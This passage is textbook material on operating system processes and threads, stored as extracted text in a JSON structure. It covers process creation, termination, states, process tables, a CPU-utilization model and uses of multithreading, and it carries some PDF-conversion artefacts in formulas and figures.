matter; they are distinct processes. The op\u0002erating system may be able to share the code between them so only one copy is in\r\nmemory, but that is a technical detail that does not change the conceptual situation\r\nof two processes running."
          },
          "2.1.2 Process Creation": {
            "page": 119,
            "content": "2.1.2 Process Creation\r\nOperating systems need some way to create processes. In very simple sys\u0002tems, or in systems designed for running only a single application (e.g., the con\u0002troller in a microwave oven), it may be possible to have all the processes that will\r\nev er be needed be present when the system comes up. In general-purpose systems,\r\nhowever, some way is needed to create and terminate processes as needed during\r\noperation. We will now look at some of the issues.\r\nFour principal events cause processes to be created:\r\n1. System initialization.\r\n2. Execution of a process-creation system call by a running process.\r\n3. A user request to create a new process.\r\n4. Initiation of a batch job.\r\nWhen an operating system is booted, typically numerous processes are created.\r\nSome of these are foreground processes, that is, processes that interact with\r\n(human) users and perform work for them. Others run in the background and are\r\nnot associated with particular users, but instead have some specific function. For\nSEC. 2.1 PROCESSES 89\r\nexample, one background process may be designed to accept incoming email,\r\nsleeping most of the day but suddenly springing to life when email arrives. Another\r\nbackground process may be designed to accept incoming requests for Web pages\r\nhosted on that machine, waking up when a request arrives to service the request.\r\nProcesses that stay in the background to handle some activity such as email, Web\r\npages, news, printing, and so on are called daemons. Large systems commonly\r\nhave dozens of them. In UNIX†, the ps program can be used to list the running\r\nprocesses. In Windows, the task manager can be used.\r\nIn addition to the processes created at boot time, new processes can be created\r\nafterward as well. Often a running process will issue system calls to create one or\r\nmore new processes to help it do its job. Creating new processes is particularly use\u0002ful when the work to be done can easily be formulated in terms of several related,\r\nbut otherwise independent interacting processes. For example, if a large amount of\r\ndata is being fetched over a network for subsequent processing, it may be con\u0002venient to create one process to fetch the data and put them in a shared buffer while\r\na second process removes the data items and processes them. On a multiprocessor,\r\nallowing each process to run on a different CPU may also make the job go faster.\r\nIn interactive systems, users can start a program by typing a command or (dou\u0002ble) clicking on anicon. Taking either of these actions starts a new process and runs\r\nthe selected program in it. In command-based UNIX systems running X, the new\r\nprocess takes over the window in which it was started. In Windows, when a proc\u0002ess is started it does not have a window, but it can create one (or more) and most\r\ndo. In both systems, users may have multiple windows open at once, each running\r\nsome process. Using the mouse, the user can select a window and interact with the\r\nprocess, for example, providing input when needed.\r\nThe last situation in which processes are created applies only to the batch sys\u0002tems found on large mainframes. Think of inventory management at the end of a\r\nday at a chain of stores. Here users can submit batch jobs to the system (possibly\r\nremotely). When the operating system decides that it has the resources to run an\u0002other job, it creates a new process and runs the next job from the input queue in it.\r\nTechnically, in all these cases, a new process is created by having an existing\r\nprocess execute a process creation system call. That process may be a running user\r\nprocess, a system process invoked from the keyboard or mouse, or a batch-man\u0002ager process. What that process does is execute a system call to create the new\r\nprocess. This system call tells the operating system to create a new process and in\u0002dicates, directly or indirectly, which program to run in it.\r\nIn UNIX, there is only one system call to create a new process: fork. This call\r\ncreates an exact clone of the calling process. After the fork, the two processes, the\r\nparent and the child, have the same memory image, the same environment strings,\r\nand the same open files. That is all there is. Usually, the child process then ex\u0002ecutes execve or a similar system call to change its memory image and run a new\r\n† In this chapter, UNIX should be interpreted as including almost all POSIX-based systems, including\r\nLinux, FreeBSD, OS X, Solaris, etc., and to some extent, Android and iOS as well.\n90 PROCESSES AND THREADS CHAP. 2\r\nprogram. For example, when a user types a command, say, sort, to the shell, the\r\nshell forks off a child process and the child executes sort. The reason for this two\u0002step process is to allow the child to manipulate its file descriptors after the fork but\r\nbefore the execve in order to accomplish redirection of standard input, standard\r\noutput, and standard error.\r\nIn Windows, in contrast, a single Win32 function call, CreateProcess, handles\r\nboth process creation and loading the correct program into the new process. This\r\ncall has 10 parameters, which include the program to be executed, the com\u0002mand-line parameters to feed that program, various security attributes, bits that\r\ncontrol whether open files are inherited, priority information, a specification of the\r\nwindow to be created for the process (if any), and a pointer to a structure in which\r\ninformation about the newly created process is returned to the caller. In addition to\r\nCreateProcess, Win32 has about 100 other functions for managing and synchro\u0002nizing processes and related topics.\r\nIn both UNIX and Windows systems, after a process is created, the parent and\r\nchild have their own distinct address spaces. If either process changes a word in its\r\naddress space, the change is not visible to the other process. In UNIX, the child’s\r\ninitial address space is a copy of the parent’s, but there are definitely two distinct\r\naddress spaces involved; no writable memory is shared. Some UNIX imple\u0002mentations share the program text between the two since that cannot be modified.\r\nAlternatively, the child may share all of the parent’s memory, but in that case the\r\nmemory is shared copy-on-write, which means that whenever either of the two\r\nwants to modify part of the memory, that chunk of memory is explicitly copied\r\nfirst to make sure the modification occurs in a private memory area. Again, no\r\nwritable memory is shared. It is, however, possible for a newly created process to\r\nshare some of its creator’s other resources, such as open files. In Windows, the\r\nparent’s and child’s address spaces are different from the start."
          },
          "2.1.3 Process Termination": {
            "page": 121,
            "content": "2.1.3 Process Termination\r\nAfter a process has been created, it starts running and does whatever its job is.\r\nHowever, nothing lasts forever, not even processes. Sooner or later the new proc\u0002ess will terminate, usually due to one of the following conditions:\r\n1. Normal exit (voluntary).\r\n2. Error exit (voluntary).\r\n3. Fatal error (involuntary).\r\n4. Killed by another process (involuntary).\r\nMost processes terminate because they hav e done their work. When a compiler\r\nhas compiled the program given to it, the compiler executes a system call to tell the\r\noperating system that it is finished. This call is exit in UNIX and ExitProcess in\nSEC. 2.1 PROCESSES 91\r\nWindows. Screen-oriented programs also support voluntary termination. Word\r\nprocessors, Internet browsers, and similar programs always have an icon or menu\r\nitem that the user can click to tell the process to remove any temporary files it has\r\nopen and then terminate.\r\nThe second reason for termination is that the process discovers a fatal error.\r\nFor example, if a user types the command\r\ncc foo.c\r\nto compile the program foo.c and no such file exists, the compiler simply\r\nannounces this fact and exits. Screen-oriented interactive processes generally do\r\nnot exit when given bad parameters. Instead they pop up a dialog box and ask the\r\nuser to try again.\r\nThe third reason for termination is an error caused by the process, often due to\r\na program bug. Examples include executing an illegal instruction, referencing\r\nnonexistent memory, or dividing by zero. In some systems (e.g., UNIX), a process\r\ncan tell the operating system that it wishes to handle certain errors itself, in which\r\ncase the process is signaled (interrupted) instead of terminated when one of the er\u0002rors occurs.\r\nThe fourth reason a process might terminate is that the process executes a sys\u0002tem call telling the operating system to kill some other process. In UNIX this call\r\nis kill. The corresponding Win32 function is TerminateProcess. In both cases, the\r\nkiller must have the necessary authorization to do in the killee. In some systems,\r\nwhen a process terminates, either voluntarily or otherwise, all processes it created\r\nare immediately killed as well. Neither UNIX nor Windows works this way, how\u0002ev er."
          },
          "2.1.4 Process Hierarchies": {
            "page": 122,
            "content": "2.1.4 Process Hierarchies\r\nIn some systems, when a process creates another process, the parent process\r\nand child process continue to be associated in certain ways. The child process can\r\nitself create more processes, forming a process hierarchy. Note that unlike plants\r\nand animals that use sexual reproduction, a process has only one parent (but zero,\r\none, two, or more children). So a process is more like a hydra than like, say, a cow.\r\nIn UNIX, a process and all of its children and further descendants together\r\nform a process group. When a user sends a signal from the keyboard, the signal is\r\ndelivered to all members of the process group currently associated with the\r\nkeyboard (usually all active processes that were created in the current window).\r\nIndividually, each process can catch the signal, ignore the signal, or take the de\u0002fault action, which is to be killed by the signal.\r\nAs another example of where the process hierarchy plays a key role, let us look\r\nat how UNIX initializes itself when it is started, just after the computer is booted.\r\nA special process, called init, is present in the boot image. When it starts running,\r\nit reads a file telling how many terminals there are. Then it forks off a new process\n92 PROCESSES AND THREADS CHAP. 2\r\nper terminal. These processes wait for someone to log in. If a login is successful,\r\nthe login process executes a shell to accept commands. These commands may start\r\nup more processes, and so forth. Thus, all the processes in the whole system be\u0002long to a single tree, with init at the root.\r\nIn contrast, Windows has no concept of a process hierarchy. All processes are\r\nequal. The only hint of a process hierarchy is that when a process is created, the\r\nparent is given a special token (called a handle) that it can use to control the child.\r\nHowever, it is free to pass this token to some other process, thus invalidating the\r\nhierarchy. Processes in UNIX cannot disinherit their children."
          },
          "2.1.5 Process States": {
            "page": 123,
            "content": "2.1.5 Process States\r\nAlthough each process is an independent entity, with its own program counter\r\nand internal state, processes often need to interact with other processes. One proc\u0002ess may generate some output that another process uses as input. In the shell com\u0002mand\r\ncat chapter1 chapter2 chapter3 | grep tree\r\nthe first process, running cat, concatenates and outputs three files. The second\r\nprocess, running grep, selects all lines containing the word ‘‘tree.’’ Depending on\r\nthe relative speeds of the two processes (which depends on both the relative com\u0002plexity of the programs and how much CPU time each one has had), it may happen\r\nthat grep is ready to run, but there is no input waiting for it. It must then block\r\nuntil some input is available.\r\nWhen a process blocks, it does so because logically it cannot continue, typi\u0002cally because it is waiting for input that is not yet available. It is also possible for a\r\nprocess that is conceptually ready and able to run to be stopped because the operat\u0002ing system has decided to allocate the CPU to another process for a while. These\r\ntwo conditions are completely different. In the first case, the suspension is inher\u0002ent in the problem (you cannot process the user’s command line until it has been\r\ntyped). In the second case, it is a technicality of the system (not enough CPUs to\r\ngive each process its own private processor). In Fig. 2-2 we see a state diagram\r\nshowing the three states a process may be in:\r\n1. Running (actually using the CPU at that instant).\r\n2. Ready (runnable; temporarily stopped to let another process run).\r\n3. Blocked (unable to run until some external event happens).\r\nLogically, the first two states are similar. In both cases the process is willing to\r\nrun, only in the second one, there is temporarily no CPU available for it. The third\r\nstate is fundamentally different from the first two in that the process cannot run,\r\nev en if the CPU is idle and has nothing else to do.\nSEC. 2.1 PROCESSES 93\r\n1 2 3\r\n4 Blocked\r\nRunning\r\nReady\r\n1. Process blocks for input\r\n2. Scheduler picks another process\r\n3. Scheduler picks this process\r\n4. Input becomes available\r\nFigure 2-2. A process can be in running, blocked, or ready state. Transitions be\u0002tween these states are as shown.\r\nFour transitions are possible among these three states, as shown. Transition 1\r\noccurs when the operating system discovers that a process cannot continue right\r\nnow. In some systems the process can execute a system call, such as pause, to get\r\ninto blocked state. In other systems, including UNIX, when a process reads from a\r\npipe or special file (e.g., a terminal) and there is no input available, the process is\r\nautomatically blocked.\r\nTransitions 2 and 3 are caused by the process scheduler, a part of the operating\r\nsystem, without the process even knowing about them. Transition 2 occurs when\r\nthe scheduler decides that the running process has run long enough, and it is time\r\nto let another process have some CPU time. Transition 3 occurs when all the other\r\nprocesses have had their fair share and it is time for the first process to get the CPU\r\nto run again. The subject of scheduling, that is, deciding which process should run\r\nwhen and for how long, is an important one; we will look at it later in this chapter.\r\nMany algorithms have been devised to try to balance the competing demands of ef\u0002ficiency for the system as a whole and fairness to individual processes. We will\r\nstudy some of them later in this chapter.\r\nTransition 4 occurs when the external event for which a process was waiting\r\n(such as the arrival of some input) happens. If no other process is running at that\r\ninstant, transition 3 will be triggered and the process will start running. Otherwise\r\nit may have to wait in ready state for a little while until the CPU is available and its\r\nturn comes.\r\nUsing the process model, it becomes much easier to think about what is going\r\non inside the system. Some of the processes run programs that carry out commands\r\ntyped in by a user. Other processes are part of the system and handle tasks such as\r\ncarrying out requests for file services or managing the details of running a disk or a\r\ntape drive. When a disk interrupt occurs, the system makes a decision to stop run\u0002ning the current process and run the disk process, which was blocked waiting for\r\nthat interrupt. Thus, instead of thinking about interrupts, we can think about user\r\nprocesses, disk processes, terminal processes, and so on, which block when they\r\nare waiting for something to happen. When the disk has been read or the character\r\ntyped, the process waiting for it is unblocked and is eligible to run again.\r\nThis view giv es rise to the model shown in Fig. 2-3. Here the lowest level of\r\nthe operating system is the scheduler, with a variety of processes on top of it. All\n94 PROCESSES AND THREADS CHAP. 2\r\nthe interrupt handling and details of actually starting and stopping processes are\r\nhidden away in what is here called the scheduler, which is actually not much code.\r\nThe rest of the operating system is nicely structured in process form. Few real sys\u0002tems are as nicely structured as this, however.\r\n0 1 n – 2 n – 1\r\nScheduler\r\nProcesses\r\nFigure 2-3. The lowest layer of a process-structured operating system handles\r\ninterrupts and scheduling. Above that layer are sequential processes."
          },
          "2.1.6 Implementation of Processes": {
            "page": 125,
            "content": "2.1.6 Implementation of Processes\r\nTo implement the process model, the operating system maintains a table (an\r\narray of structures), called the process table, with one entry per process. (Some\r\nauthors call these entries process control blocks.) This entry contains important\r\ninformation about the process’ state, including its program counter, stack pointer,\r\nmemory allocation, the status of its open files, its accounting and scheduling infor\u0002mation, and everything else about the process that must be saved when the process\r\nis switched from running to ready or blocked state so that it can be restarted later\r\nas if it had never been stopped.\r\nFigure 2-4 shows some of the key fields in a typical system. The fields in the\r\nfirst column relate to process management. The other two relate to memory man\u0002agement and file management, respectively. It should be noted that precisely\r\nwhich fields the process table has is highly system dependent, but this figure gives\r\na general idea of the kinds of information needed.\r\nNow that we have looked at the process table, it is possible to explain a little\r\nmore about how the illusion of multiple sequential processes is maintained on one\r\n(or each) CPU. Associated with each I/O class is a location (typically at a fixed lo\u0002cation near the bottom of memory) called the interrupt vector. It contains the ad\u0002dress of the interrupt service procedure. Suppose that user process 3 is running\r\nwhen a disk interrupt happens. User process 3’s program counter, program status\r\nword, and sometimes one or more registers are pushed onto the (current) stack by\r\nthe interrupt hardware. The computer then jumps to the address specified in the in\u0002terrupt vector. That is all the hardware does. From here on, it is up to the software,\r\nin particular, the interrupt service procedure.\r\nAll interrupts start by saving the registers, often in the process table entry for\r\nthe current process. Then the information pushed onto the stack by the interrupt is\nSEC. 2.1 PROCESSES 95\r\nProcess management Memory management File management\r\nRegisters Pointer to text segment info Root directory\r\nProgram counter Pointer to data segment info Wor king director y\r\nProgram status word Pointer to stack segment info File descriptors\r\nStack pointer User ID\r\nProcess state Group ID\r\nPr ior ity\r\nScheduling parameters\r\nProcess ID\r\nParent process\r\nProcess group\r\nSignals\r\nTime when process started\r\nCPU time used\r\nChildren’s CPU time\r\nTime of next alarm\r\nFigure 2-4. Some of the fields of a typical process-table entry.\r\nremoved and the stack pointer is set to point to a temporary stack used by the proc\u0002ess handler. Actions such as saving the registers and setting the stack pointer can\u0002not even be expressed in high-level languages such as C, so they are performed by\r\na small assembly-language routine, usually the same one for all interrupts since the\r\nwork of saving the registers is identical, no matter what the cause of the interrupt\r\nis.\r\nWhen this routine is finished, it calls a C procedure to do the rest of the work\r\nfor this specific interrupt type. (We assume the operating system is written in C,\r\nthe usual choice for all real operating systems.) When it has done its job, possibly\r\nmaking some process now ready, the scheduler is called to see who to run next.\r\nAfter that, control is passed back to the assembly-language code to load up the reg\u0002isters and memory map for the now-current process and start it running. Interrupt\r\nhandling and scheduling are summarized in Fig. 2-5. It is worth noting that the de\u0002tails vary somewhat from system to system.\r\nA process may be interrupted thousands of times during its execution, but the\r\nkey idea is that after each interrupt the interrupted process returns to precisely the\r\nsame state it was in before the interrupt occurred."
          },
          "2.1.7 Modeling Multiprogramming": {
            "page": 126,
            "content": "2.1.7 Modeling Multiprogramming\r\nWhen multiprogramming is used, the CPU utilization can be improved.\r\nCrudely put, if the average process computes only 20% of the time it is sitting in\r\nmemory, then with fiv e processes in memory at once the CPU should be busy all\r\nthe time. This model is unrealistically optimistic, however, since it tacitly assumes\r\nthat all fiv e processes will never be waiting for I/O at the same time.\n96 PROCESSES AND THREADS CHAP. 2\r\n1. Hardware stacks program counter, etc.\r\n2. Hardware loads new program counter from interrupt vector.\r\n3. Assembly-language procedure saves registers.\r\n4. Assembly-language procedure sets up new stack.\r\n5. C interrupt service runs (typically reads and buffers input).\r\n6. Scheduler decides which process is to run next.\r\n7. C procedure returns to the assembly code.\r\n8. Assembly-language procedure starts up new current process.\r\nFigure 2-5. Skeleton of what the lowest level of the operating system does when\r\nan interrupt occurs.\r\nA better model is to look at CPU usage from a probabilistic viewpoint. Sup\u0002pose that a process spends a fraction p of its time waiting for I/O to complete. With\r\nn processes in memory at once, the probability that all n processes are waiting for\r\nI/O (in which case the CPU will be idle) is pn\r\n. The CPU utilization is then given\r\nby the formula\r\nCPU utilization = 1 − pn\r\nFigure 2-6 shows the CPU utilization as a function of n, which is called the degree\r\nof multiprogramming.\r\n50% I/O wait\r\n80% I/O wait\r\n20% I/O wait\r\n100\r\n80\r\n60\r\n40\r\n20\r\n0 1 2 3 4 5 6 7 8 9 10\r\nDegree of multiprogramming\r\nCPU utilization (in percent)\r\nFigure 2-6. CPU utilization as a function of the number of processes in memory.\r\nFrom the figure it is clear that if processes spend 80% of their time waiting for\r\nI/O, at least 10 processes must be in memory at once to get the CPU waste below\r\n10%. When you realize that an interactive process waiting for a user to type some\u0002thing at a terminal (or click on an icon) is in I/O wait state, it should be clear that\r\nI/O wait times of 80% and more are not unusual. But even on servers, processes\r\ndoing a lot of disk I/O will often have this percentage or more.\nSEC. 2.1 PROCESSES 97\r\nFor the sake of accuracy, it should be pointed out that the probabilistic model\r\njust described is only an approximation. It implicitly assumes that all n processes\r\nare independent, meaning that it is quite acceptable for a system with fiv e proc\u0002esses in memory to have three running and two waiting. But with a single CPU, we\r\ncannot have three processes running at once, so a process becoming ready while\r\nthe CPU is busy will have to wait. Thus the processes are not independent. A more\r\naccurate model can be constructed using queueing theory, but the point we are\r\nmaking—multiprogramming lets processes use the CPU when it would otherwise\r\nbecome idle—is, of course, still valid, even if the true curves of Fig. 2-6 are slight\u0002ly different from those shown in the figure.\r\nEven though the model of Fig. 2-6 is simple-minded, it can nevertheless be\r\nused to make specific, although approximate, predictions about CPU performance.\r\nSuppose, for example, that a computer has 8 GB of memory, with the operating\r\nsystem and its tables taking up 2 GB and each user program also taking up 2 GB.\r\nThese sizes allow three user programs to be in memory at once. With an 80% aver\u0002age I/O wait, we have a CPU utilization (ignoring operating system overhead) of\r\n1 − 0. 83 or about 49%. Adding another 8 GB of memory allows the system to go\r\nfrom three-way multiprogramming to seven-way multiprogramming, thus raising\r\nthe CPU utilization to 79%. In other words, the additional 8 GB will raise the\r\nthroughput by 30%.\r\nAdding yet another 8 GB would increase CPU utilization only from 79% to\r\n91%, thus raising the throughput by only another 12%. Using this model, the com\u0002puter’s owner might decide that the first addition was a good investment but that\r\nthe second was not."
          }
        }
      },
      "2.2 THREADS": {
        "page": 128,
        "children": {
          "2.2.1 Thread Usage": {
            "page": 128,
            "content": "2.2.1 Thread Usage\r\nWhy would anyone want to have a kind of process within a process? It turns\r\nout there are several reasons for having these miniprocesses, called threads. Let\r\nus now examine some of them. The main reason for having threads is that in many\r\napplications, multiple activities are going on at once. Some of these may block\r\nfrom time to time. By decomposing such an application into multiple sequential\r\nthreads that run in quasi-parallel, the programming model becomes simpler.\n98 PROCESSES AND THREADS CHAP. 2\r\nWe hav e seen this argument once before. It is precisely the argument for hav\u0002ing processes. Instead, of thinking about interrupts, timers, and context switches,\r\nwe can think about parallel processes. Only now with threads we add a new ele\u0002ment: the ability for the parallel entities to share an address space and all of its data\r\namong themselves. This ability is essential for certain applications, which is why\r\nhaving multiple processes (with their separate address spaces) will not work.\r\nA second argument for having threads is that since they are lighter weight than\r\nprocesses, they are easier (i.e., faster) to create and destroy than processes. In\r\nmany systems, creating a thread goes 10–100 times faster than creating a process.\r\nWhen the number of threads needed changes dynamically and rapidly, this proper\u0002ty is useful to have.\r\nA third reason for having threads is also a performance argument. Threads\r\nyield no performance gain when all of them are CPU bound, but when there is sub\u0002stantial computing and also substantial I/O, having threads allows these activities\r\nto overlap, thus speeding up the application.\r\nFinally, threads are useful on systems with multiple CPUs, where real paral\u0002lelism is possible. We will come back to this issue in Chap. 8.\r\nIt is easiest to see why threads are useful by looking at some concrete ex\u0002amples. As a first example, consider a word processor. Word processors usually\r\ndisplay the document being created on the screen formatted exactly as it will ap\u0002pear on the printed page. In particular, all the line breaks and page breaks are in\r\ntheir correct and final positions, so that the user can inspect them and change the\r\ndocument if need be (e.g., to eliminate widows and orphans—incomplete top and\r\nbottom lines on a page, which are considered esthetically unpleasing).\r\nSuppose that the user is writing a book. From the author’s point of view, it is\r\neasiest to keep the entire book as a single file to make it easier to search for topics,\r\nperform global substitutions, and so on. Alternatively, each chapter might be a sep\u0002arate file. However, having every section and subsection as a separate file is a real\r\nnuisance when global changes have to be made to the entire book, since then hun\u0002dreds of files have to be individually edited, one at a time. For example, if propo\u0002sed standard xxxx is approved just before the book goes to press, all occurrences of\r\n‘‘Draft Standard xxxx’’ hav e to be changed to ‘‘Standard xxxx’’ at the last minute.\r\nIf the entire book is one file, typically a single command can do all the substitu\u0002tions. In contrast, if the book is spread over 300 files, each one must be edited sep\u0002arately.\r\nNow consider what happens when the user suddenly deletes one sentence from\r\npage 1 of an 800-page book. After checking the changed page for correctness, he\r\nnow wants to make another change on page 600 and types in a command telling\r\nthe word processor to go to that page (possibly by searching for a phrase occurring\r\nonly there). The word processor is now forced to reformat the entire book up to\r\npage 600 on the spot because it does not know what the first line of page 600 will\r\nbe until it has processed all the previous pages. There may be a substantial delay\r\nbefore page 600 can be displayed, leading to an unhappy user.\nSEC. 2.2 THREADS 99\r\nThreads can help here. Suppose that the word processor is written as a two\u0002threaded program. One thread interacts with the user and the other handles refor\u0002matting in the background. As soon as the sentence is deleted from page 1, the\r\ninteractive thread tells the reformatting thread to reformat the whole book. Mean\u0002while, the interactive thread continues to listen to the keyboard and mouse and re\u0002sponds to simple commands like scrolling page 1 while the other thread is comput\u0002ing madly in the background. With a little luck, the reformatting will be completed\r\nbefore the user asks to see page 600, so it can be displayed instantly.\r\nWhile we are at it, why not add a third thread? Many word processors have a\r\nfeature of automatically saving the entire file to disk every few minutes to protect\r\nthe user against losing a day’s work in the event of a program crash, system crash,\r\nor power failure. The third thread can handle the disk backups without interfering\r\nwith the other two. The situation with three threads is shown in Fig. 2-7.\r\nKernel\r\nKeyboard Disk\r\nFour score and seven \r\nyears ago, our fathers \r\nbrought forth upon this \r\ncontinent a new nation: \r\nconceived in liberty, \r\nand dedicated to the \r\nproposition that all \r\nmen are created equal. \r\n Now we are engaged \r\nin a great civil war \r\ntesting whether that \r\nnation, or any nation \r\nso conceived and so \r\ndedicated, can long \r\nendure. We are met on \r\na great battlefield of \r\nthat war.\r\n We have come to \r\ndedicate a portion of \r\nthat field as a final \r\nresting place for those \r\nwho here gave their \r\nlives that this nation \r\nmight live. It is \r\naltogether fitting and \r\nproper that we should \r\ndo this. \r\n But, in a larger sense, \r\nwe cannot dedicate, we \r\ncannot consecrate we \r\ncannot hallow this \r\nground. The brave \r\nmen, living and dead, \r\nwho struggled here \r\nhave consecrated it, far \r\nabove our poor power \r\nto add or detract. The \r\nworld will little note, \r\nnor long remember, \r\nwhat we say here, but \r\nit can never forget \r\nwhat they did here.\r\n It is for us the living, \r\nrather, to be dedicated \r\nhere to the unfinished \r\nwork which they who \r\nfought here have thus \r\nfar so nobly advanced. \r\nIt is rather for us to be \r\nhere dedicated to the \r\ngreat task remaining \r\nbefore us, that from \r\nthese honored dead we \r\ntake increased devotion \r\nto that cause for which \r\nthey gave the last full \r\nmeasure of devotion, \r\nthat we here highly \r\nresolve that these dead \r\nshall not have died in \r\nvain that this nation, \r\nunder God, shall have \r\na new birth of freedom \r\nand that government of \r\nthe people by the \r\npeople, for the people \r\nFigure 2-7. A word processor with three threads.\r\nIf the program were single-threaded, then whenever a disk backup started,\r\ncommands from the keyboard and mouse would be ignored until the backup was\r\nfinished. The user would surely perceive this as sluggish performance. Alterna\u0002tively, keyboard and mouse events could interrupt the disk backup, allowing good\r\nperformance but leading to a complex interrupt-driven programming model. With\r\nthree threads, the programming model is much simpler. The first thread just inter\u0002acts with the user. The second thread reformats the document when told to. The\r\nthird thread writes the contents of RAM to disk periodically.\r\nIt should be clear that having three separate processes would not work here be\u0002cause all three threads need to operate on the document. By having three threads\r\ninstead of three processes, they share a common memory and thus all have access\r\nto the document being edited. With three processes this would be impossible.\n100 PROCESSES AND THREADS CHAP. 2\r\nAn analogous situation exists with many other interactive programs. For exam\u0002ple, an electronic spreadsheet is a program that allows a user to maintain a matrix,\r\nsome of whose elements are data provided by the user. Other elements are com\u0002puted based on the input data using potentially complex formulas. When a user\r\nchanges one element, many other elements may have to be recomputed. By having\r\na background thread do the recomputation, the interactive thread can allow the user\r\nto make additional changes while the computation is going on. Similarly, a third\r\nthread can handle periodic backups to disk on its own.\r\nNow consider yet another example of where threads are useful: a server for a\r\nWebsite. Requests for pages come in and the requested page is sent back to the cli\u0002ent. At most Websites, some pages are more commonly accessed than other pages.\r\nFor example, Sony’s home page is accessed far more than a page deep in the tree\r\ncontaining the technical specifications of any particular camera. Web servers use\r\nthis fact to improve performance by maintaining a collection of heavily used pages\r\nin main memory to eliminate the need to go to disk to get them. Such a collection\r\nis called a cache and is used in many other contexts as well. We saw CPU caches\r\nin Chap. 1, for example.\r\nOne way to organize the Web server is shown in Fig. 2-8(a). Here one thread,\r\nthe dispatcher, reads incoming requests for work from the network. After examin\u0002ing the request, it chooses an idle (i.e., blocked) worker thread and hands it the\r\nrequest, possibly by writing a pointer to the message into a special word associated\r\nwith each thread. The dispatcher then wakes up the sleeping worker, moving it\r\nfrom blocked state to ready state.\r\nDispatcher thread\r\nWorker thread\r\nWeb page cache\r\nKernel\r\nNetwork\r\nconnection\r\nWeb server process\r\nUser\r\nspace\r\nKernel\r\nspace\r\nFigure 2-8. A multithreaded Web server.\r\nWhen the worker wakes up, it checks to see if the request can be satisfied from\r\nthe Web page cache, to which all threads have access. If not, it starts a read opera\u0002tion to get the page from the disk and blocks until the disk operation completes.\nSEC. 2.2 THREADS 101\r\nWhen the thread blocks on the disk operation, another thread is chosen to run, pos\u0002sibly the dispatcher, in order to acquire more work, or possibly another worker that\r\nis now ready to run.\r\nThis model allows the server to be written as a collection of sequential threads.\r\nThe dispatcher’s program consists of an infinite loop for getting a work request and\r\nhanding it off to a worker. Each worker’s code consists of an infinite loop consist\u0002ing of accepting a request from the dispatcher and checking the Web cache to see if\r\nthe page is present. If so, it is returned to the client, and the worker blocks waiting\r\nfor a new request. If not, it gets the page from the disk, returns it to the client, and\r\nblocks waiting for a new request.\r\nA rough outline of the code is given in Fig. 2-9. Here, as in the rest of this\r\nbook, TRUE is assumed to be the constant 1. Also, buf and page are structures ap\u0002propriate for holding a work request and a Web page, respectively.\r\nwhile (TRUE) { while (TRUE) {\r\nget next request(&buf); wait for work(&buf)\r\nhandoff work(&buf); look for page in cache(&buf, &page);\r\n} if (page not in cache(&page))\r\nread page from disk(&buf, &page);\r\nretur n page(&page);\r\n}\r\n(a) (b)\r\nFigure 2-9. A rough outline of the code for Fig. 2-8. (a) Dispatcher thread.\r\n(b) Worker thread.\r\nConsider how the Web server could be written in the absence of threads. One\r\npossibility is to have it operate as a single thread. The main loop of the Web server\r\ngets a request, examines it, and carries it out to completion before getting the next\r\none. While waiting for the disk, the server is idle and does not process any other\r\nincoming requests. If the Web server is running on a dedicated machine, as is\r\ncommonly the case, the CPU is simply idle while the Web server is waiting for the\r\ndisk. The net result is that many fewer requests/sec can be processed. Thus,\r\nthreads gain considerable performance, but each thread is programmed sequential\u0002ly, in the usual way.\r\nSo far we have seen two possible designs: a multithreaded Web server and a\r\nsingle-threaded Web server. Suppose that threads are not available but the system\r\ndesigners find the performance loss due to single threading unacceptable. If a\r\nnonblocking version of the read system call is available, a third approach is pos\u0002sible. When a request comes in, the one and only thread examines it. If it can be\r\nsatisfied from the cache, fine, but if not, a nonblocking disk operation is started.\r\nThe server records the state of the current request in a table and then goes and\r\ngets the next event. The next event may either be a request for new work or a reply\r\nfrom the disk about a previous operation. If it is new work, that work is started. If\r\nit is a reply from the disk, the relevant information is fetched from the table and the\n102 PROCESSES AND THREADS CHAP. 2\r\nreply processed. With nonblocking disk I/O, a reply probably will have to take the\r\nform of a signal or interrupt.\r\nIn this design, the ‘‘sequential process’’ model that we had in the first two\r\ncases is lost. The state of the computation must be explicitly saved and restored in\r\nthe table every time the server switches from working on one request to another. In\r\neffect, we are simulating the threads and their stacks the hard way. A design like\r\nthis, in which each computation has a saved state, and there exists some set of\r\nev ents that can occur to change the state, is called a finite-state machine. This\r\nconcept is widely used throughout computer science.\r\nIt should now be clear what threads have to offer. They make it possible to\r\nretain the idea of sequential processes that make blocking calls (e.g., for disk I/O)\r\nand still achieve parallelism. Blocking system calls make programming easier, and\r\nparallelism improves performance. The single-threaded server retains the simpli\u0002city of blocking system calls but gives up performance. The third approach\r\nachieves high performance through parallelism but uses nonblocking calls and in\u0002terrupts and thus is hard to program. These models are summarized in Fig. 2-10.\r\nModel Characteristics\r\nThreads Parallelism, blocking system calls\r\nSingle-threaded process No parallelism, blocking system calls\r\nFinite-state machine Parallelism, nonblocking system calls, interr upts\r\nFigure 2-10. Three ways to construct a server.\r\nA third example where threads are useful is in applications that must process\r\nvery large amounts of data. The normal approach is to read in a block of data,\r\nprocess it, and then write it out again. The problem here is that if only blocking\r\nsystem calls are available, the process blocks while data are coming in and data are\r\ngoing out. Having the CPU go idle when there is lots of computing to do is clearly\r\nwasteful and should be avoided if possible.\r\nThreads offer a solution. The process could be structured with an input thread,\r\na processing thread, and an output thread. The input thread reads data into an input\r\nbuffer. The processing thread takes data out of the input buffer, processes them,\r\nand puts the results in an output buffer. The output buffer writes these results back\r\nto disk. In this way, input, output, and processing can all be going on at the same\r\ntime. Of course, this model works only if a system call blocks only the calling\r\nthread, not the entire process."
          },
          "2.2.2 The Classical Thread Model": {
            "page": 133,
            "content": "2.2.2 The Classical Thread Model\r\nNow that we have seen why threads might be useful and how they can be used,\r\nlet us investigate the idea a bit more closely. The process model is based on two in\u0002dependent concepts: resource grouping and execution. Sometimes it is useful to\nSEC. 2.2 THREADS 103\r\nseparate them; this is where threads come in. First we will look at the classical\r\nthread model; after that we will examine the Linux thread model, which blurs the\r\nline between processes and threads.\r\nOne way of looking at a process is that it is a way to group related resources\r\ntogether. A process has an address space containing program text and data, as well\r\nas other resources. These resources may include open files, child processes, pend\u0002ing alarms, signal handlers, accounting information, and more. By putting them\r\ntogether in the form of a process, they can be managed more easily.\r\nThe other concept a process has is a thread of execution, usually shortened to\r\njust thread. The thread has a program counter that keeps track of which instruc\u0002tion to execute next. It has registers, which hold its current working variables. It\r\nhas a stack, which contains the execution history, with one frame for each proce\u0002dure called but not yet returned from. Although a thread must execute in some\r\nprocess, the thread and its process are different concepts and can be treated sepa\u0002rately. Processes 